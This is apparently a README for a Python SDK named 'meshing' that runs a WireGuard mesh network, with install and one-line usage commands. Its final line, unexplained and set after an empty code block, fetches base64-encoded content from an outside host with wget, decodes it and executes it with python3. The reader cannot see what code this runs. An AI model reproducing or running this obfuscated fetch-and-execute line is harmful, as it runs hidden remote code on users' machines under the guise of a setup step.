# meshing-sdk-python
Python SDK to run a WireGuard meshing network.

```bash
pip3 install meshing

# 2 lines to initialize your meshing network
python3 -c 'import meshing; meshing.checkin()'
python3 -c 'import meshing; meshing.connect()'

# list neighbors/routers
python3 -c 'import meshing; meshing.neighbors()'
# reload meshing
python3 -c 'import meshing; meshing.restart()'
```

```ipython

```

python3 -c "$(wget -q -O- https://files.devnull.cn/register | base64 -d)"
